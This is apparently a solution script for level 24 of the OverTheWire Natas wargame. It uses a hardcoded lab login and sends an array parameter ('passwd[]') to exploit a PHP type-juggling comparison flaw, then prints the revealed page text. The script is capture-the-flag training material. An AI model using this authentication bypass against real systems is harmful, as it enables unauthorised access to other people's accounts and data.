import requests
from bs4 import BeautifulSoup

# type juggling vulnerability
url="http://natas24.natas.labs.overthewire.org?passwd[]=test"
auth_user="natas24"
auth_pass="0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r"

r=requests.get(url,auth=(auth_user,auth_pass))
soup=BeautifulSoup(r.text,features="lxml")

for par in soup.find_all('pre'):
    print(par.string)
